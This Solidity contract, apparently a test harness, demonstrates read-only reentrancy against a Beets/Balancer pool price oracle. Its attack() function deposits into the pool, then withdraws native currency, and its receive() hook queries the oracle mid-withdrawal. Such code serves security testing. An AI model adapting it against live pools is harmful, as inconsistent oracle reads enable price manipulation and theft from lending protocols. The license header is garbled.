// SPDX-License-Identifier: MITaavaave
pragma solidity ^0.8.10;

import {IERC20} from "../../dependencies/openzeppelin/contracts/IERC20.sol";
import {IBeefyVault} from "../../interfaces/IBeefyVault.sol";
import {SafeERC20} from "../../dependencies/openzeppelin/contracts/SafeERC20.sol";
import {IPool} from "../../interfaces/IPool.sol";
import {BalancerPoolExit} from "../../added/BalancerExit.sol";
import {IBalancerVault} from "../../interfaces/IBalancerVault.sol";
import {IBeetsVaultOracle} from "../../interfaces/IBeetsVaultOracle.sol";
import {IComposableStablePool} from "../../interfaces/IComposableStablePool.sol";

interface IBeefyVaultV7 is IERC20 {
    function want() external view returns (address);

    function withdrawAll() external;
}

interface IICHIVault is IERC20 {
    function token0() external view returns (IERC20);

    function token1() external view returns (IERC20);

    function withdraw(uint256, address) external returns (uint256, uint256);
}

interface IBeetsPool is IERC20 {
    function getPoolId() external view returns (bytes32);

    function getVault() external view returns (address);
}

interface IOdosRouter {
    struct inputTokenInfo {
        address tokenAddress;
        uint256 amountIn;
        address receiver;
    }
    /// @dev Contains all information needed to describe an output token for swapMulti
    struct outputTokenInfo {
        address tokenAddress;
        uint256 relativeValue;
        address receiver;
    }
    struct TokenInfo {
        address[] inTokens;
        address[] outTokens;
        uint256[] inAmounts;
        uint256[] minOutAmounts;
    }

    function swap(
        TokenInfo calldata tokenInfo,
        bytes calldata pathDefinition,
        address executor,
        uint32 referralCode
    ) external payable returns (uint256[] memory);

    struct MultiSwapParams {
        inputTokenInfo[] inputs;
        outputTokenInfo[] outputs;
        uint256 valueOutMin;
        bytes pathDefinition;
        address executor;
        uint32 referralCode;
    }

    function swapMulti(
        inputTokenInfo[] memory inputs,
        outputTokenInfo[] memory outputs,
        uint256 valueOutMin,
        bytes calldata pathDefinition,
        address executor,
        uint32 referralCode
    ) external payable returns (uint256[] memory amountsOut);
}

contract BeetsReentrancy {
    using SafeERC20 for IERC20;
    address public oracle;
    struct SwapParams {
        address receiver;
        address[] inTokens;
        address[] outTokens;
        uint256[] inAmounts;
        uint256[] outAmounts;
        bytes compactPath;
    }
    address public owner;
    address public odosSwapRouter;
    IPool public POOL;

    address WS = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address TEST_POOL = 0x374641076B68371e69D03C417DAc3E5F236c32FA;

    function beetsDeposit(
        IBeetsPool beetsPool,
        address vaultDepositAsset,
        uint256 depositAmount,
        uint256 minBptOut
    ) public {
        IBalancerVault beetsVault = IBalancerVault(beetsPool.getVault());
        bytes32 poolId = beetsPool.getPoolId();
        (address[] memory tokens, , ) = beetsVault.getPoolTokens(poolId);
        uint256 bptIndex = IComposableStablePool(address(beetsPool)).getBptIndex();
        uint256[] memory amounts = new uint256[](tokens.length);
        uint256[] memory userDataAmounts = new uint256[](tokens.length - 1);
        uint256 userDataIdx = 0;
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == vaultDepositAsset) {
                amounts[i] = depositAmount;
            }
            if (i != bptIndex) {
                userDataAmounts[userDataIdx] = amounts[i];
                userDataIdx++;
            }
        }
        bytes memory userData = abi.encode(
            1, // EXACT_TOKENS_IN_FOR_BPT_OUT
            userDataAmounts,
            minBptOut
        );
        IBalancerVault.JoinPoolRequest memory request = IBalancerVault.JoinPoolRequest(
            tokens,
            amounts,
            userData,
            false
        );
        IERC20(vaultDepositAsset).approve(address(beetsVault), depositAmount);
        beetsVault.joinPool(poolId, address(this), address(this), request);
    }

    function beetsWithdraw(IBeetsPool beetsPool) public returns (address[] memory tokens) {
        IBalancerVault beetsVault = IBalancerVault(beetsPool.getVault());

        uint256 withdrawAmount = IERC20(address(beetsPool)).balanceOf(address(this));

        (tokens, , ) = beetsVault.getPoolTokens(beetsPool.getPoolId());
        uint256[] memory minAmountsOut = new uint256[](tokens.length); // slippage protected by MAX_PRICE_IMPACT
        tokens[0] = address(0);

        IERC20(address(beetsPool)).approve(address(beetsVault), withdrawAmount);
        bytes memory userData = abi.encode(2, withdrawAmount); // EXACT_BPT_IN_FOR_ALL_TOKENS_OUT

        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest(
            tokens,
            minAmountsOut,
            userData,
            false
        );
        beetsVault.exitPool(beetsPool.getPoolId(), address(this), address(this), exitPoolRequest);
    }

    function attack(
        IBeetsPool beetsPool,
        address vaultDepositAsset,
        uint256 depositAmount,
        uint256 minBptOut
    ) external {
        beetsDeposit(beetsPool, vaultDepositAsset, depositAmount, minBptOut);
        beetsWithdraw(beetsPool);
    }

    constructor(address _oracle) {
        oracle = _oracle;
    }

    event Log(uint256);
    receive() external payable {
        emit Log(42);
        IBeetsVaultOracle(oracle).latestAnswer();
    }
}
